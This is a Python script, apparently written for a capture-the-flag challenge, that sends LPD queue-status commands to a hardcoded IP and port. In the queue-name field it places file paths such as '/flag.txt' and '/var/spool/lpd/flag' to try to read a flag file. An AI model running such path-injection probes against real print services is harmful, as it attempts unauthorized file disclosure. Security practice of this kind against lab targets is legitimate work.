#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def try_cmd03(queue_name):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        # Comando 0x03 (short queue status)
        data = b'\x03' + queue_name.encode() + b'\n'
        s.sendall(data)
        time.sleep(0.5)
        
        resp = b''
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return f"Error: {e}".encode()

# Probar paths interesantes con comando 0x03
queues = [
    "lp",
    "/var/spool/lpd/lp",
    "/var/spool/lpd/flag",
    "/var/spool/lpd/.flag",
    "flag",
    "/flag.txt",
    "/flag",
]

print("=== Testing comando 0x03 (short queue) ===\n")
for q in queues:
    print(f"Queue: {q!r}")
    resp = try_cmd03(q)
    print(f"  Length: {len(resp)}")
    if len(resp) > 1:
        print(f"  Hex: {resp[:200].hex()}")
        try:
            decoded = resp.decode('utf-8', errors='replace')
            print(f"  Text: {decoded[:500]}")
        except:
            print(f"  Raw: {resp[:100]}")
    print()